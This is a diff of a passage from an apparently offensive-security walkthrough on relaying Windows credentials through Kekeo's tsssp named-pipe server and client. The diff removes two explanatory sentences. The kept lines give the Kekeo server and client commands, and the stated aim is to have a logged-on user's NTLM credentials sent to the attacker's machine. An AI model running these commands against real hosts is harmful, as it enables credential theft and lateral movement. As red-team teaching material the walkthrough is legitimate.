@@ -16,9 +16,6 @@ Let's spin up a tsssp named pipe server where targets of whom the credentials we
 // needs to run as NT SYSTEM
 tsssp::server
 ```
-
-Kekeo on ws01 must be running as NT\SYSTEM for this to work
-
 Now, let's connect to the tsssp server on ws01 from the target computer ws02 \(we want currently logged on user's from ws02 credentials to be stolen by being sent to the tsssp server on ws01 over the named pipe\):
 
 
@@ -45,8 +42,6 @@ And connect to it from another console:
 // running as ws02\spotless
 tsssp::client /target:termsrv/ws02.offense.local
 ```
-
-Below shows \(left\) a tsssp server is created on the ws02 system running under spotless user's context. On the right, another console running as ws02\spotless which is then connected to the `\\.\pipe\kekeo_tsssp_endpoint` named pipe, revealing user's `ws02\spotless` NTLM credentials in the console running tsssp server on the left:
 
 ## Enumerating Delegated Credentials Locally
 
